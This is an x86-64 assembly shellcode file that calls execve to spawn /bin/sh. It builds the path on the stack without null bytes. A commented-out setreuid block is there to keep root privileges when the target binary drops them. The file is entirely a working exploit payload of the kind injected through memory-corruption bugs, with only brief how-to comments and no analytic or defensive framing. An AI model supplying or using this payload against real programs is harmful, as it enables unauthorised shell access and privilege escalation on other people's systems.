section .data

section .text

global _start
_start:
;sys_setreuid(uid_t ruid,uid_t euid) (syscall 0x71) No need if binary does not drop privileg
;xor rax,rax
;mov al, 113
;xor rbx,rbx
;mov rcx,rbx
;syscall

xor rsi, rsi
xor rdx,rdx
mov qword rbx,'//bin/sh'
shr rbx,0x8
push rbx; push /bin/sh to stack
mov rdi,rsp;set rdi = rbx = /bin/sh
;xor rax,rax If we setreuid we need to 0 rax again
push rax; push zeros to stack
push rdi;push /bin/sh to stack
mov rsi,rsp;set rsi = [/bin/sh]
mov al, 0x3b
syscall

